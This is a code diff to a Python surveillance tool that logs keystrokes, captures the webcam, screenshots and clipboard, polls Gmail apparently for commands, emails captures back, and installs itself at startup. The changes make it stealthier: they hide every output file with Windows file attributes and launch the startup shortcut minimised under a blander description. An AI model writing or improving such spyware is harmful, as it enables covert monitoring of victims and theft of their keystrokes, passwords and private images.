@@ -10,28 +10,25 @@ Requirements:
 """
 
 import datetime
-import signal
 import sys
 import threading
 import time
 import cv2
 import pyautogui
-from PIL import Image
 from pathlib import Path
 import pyperclip
 from pynput import keyboard
 import imaplib
 import email
-import logging
 import smtplib
 from email.header import decode_header
 from email.mime.multipart import MIMEMultipart
-from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email import encoders
 from concurrent.futures import ThreadPoolExecutor
 import os
 import sys
+import ctypes
 
 imaplib.Debug=0
 
@@ -51,7 +48,7 @@ EMAIL_PASS    = "<APP PASSWORD>"
 POLL_INTERVAL = 2
 CAM_OUTPUT_FILE = Path("webcam.jpg")
 SS_OUTPUT_FILE  = Path("screenshot.png")
-
+FILE_ATTRIBUTE_HIDDEN = 0x02
 SHORTCUT_PATH=Path("")
 
 log_lock = threading.Lock()
@@ -206,6 +203,7 @@ class GmailPoller(threading.Thread):
 # ── Keystroke thread ───────────────────────────────────────────────────────────
 
 def run_keylogger(stop_event: threading.Event) -> None:
+    ctypes.windll.kernel32.SetFileAttributesW(OUTPUT_FILE, FILE_ATTRIBUTE_HIDDEN)
     log_file = OUTPUT_FILE.open("a", encoding="utf-8")
     ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     with log_lock:
@@ -255,6 +253,7 @@ def capture_webcam(sender: str):
         return
 
     cv2.imwrite(str(CAM_OUTPUT_FILE), frame)
+    ctypes.windll.kernel32.SetFileAttributesW(CAM_OUTPUT_FILE, FILE_ATTRIBUTE_HIDDEN)
     print(f"Webcam image saved to {CAM_OUTPUT_FILE}")
 
     # Send it back via email
@@ -281,6 +280,7 @@ def capture_webcam(sender: str):
 def capture_screenshot(sender: str):
     screenshot = pyautogui.screenshot()
     screenshot.save(str(SS_OUTPUT_FILE))
+    ctypes.windll.kernel32.SetFileAttributesW(SS_OUTPUT_FILE, FILE_ATTRIBUTE_HIDDEN)
     print(f"Screenshot saved to {SS_OUTPUT_FILE}")
 
     # Send it back via email
@@ -305,6 +305,7 @@ def capture_screenshot(sender: str):
 # ── Clipboard monitor thread ───────────────────────────────────────────────────
 
 def run_clipboard_monitor(stop_event: threading.Event)->None:
+    ctypes.windll.kernel32.SetFileAttributesW(CLIP_OUTPUT_FILE, FILE_ATTRIBUTE_HIDDEN)
     clip_file = CLIP_OUTPUT_FILE.open("a", encoding="utf-8")
     ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     clip_file.write(f"--- Clipboard monitor started at {ts} ---\n")
@@ -414,7 +415,8 @@ def create_startup_shortcut():
     shortcut.TargetPath = sys.executable          # e.g. C:\Python312\python.exe
     shortcut.Arguments = f'"{script_path}"'
     shortcut.WorkingDirectory = os.path.dirname(script_path)
-    shortcut.Description = "Hello World startup script"
+    shortcut.Description = "startup script"
+    shortcut.WindowStyle = 7
     shortcut.Save()
  
     print(f"[+] Startup shortcut created:\n    {shortcut_path}")
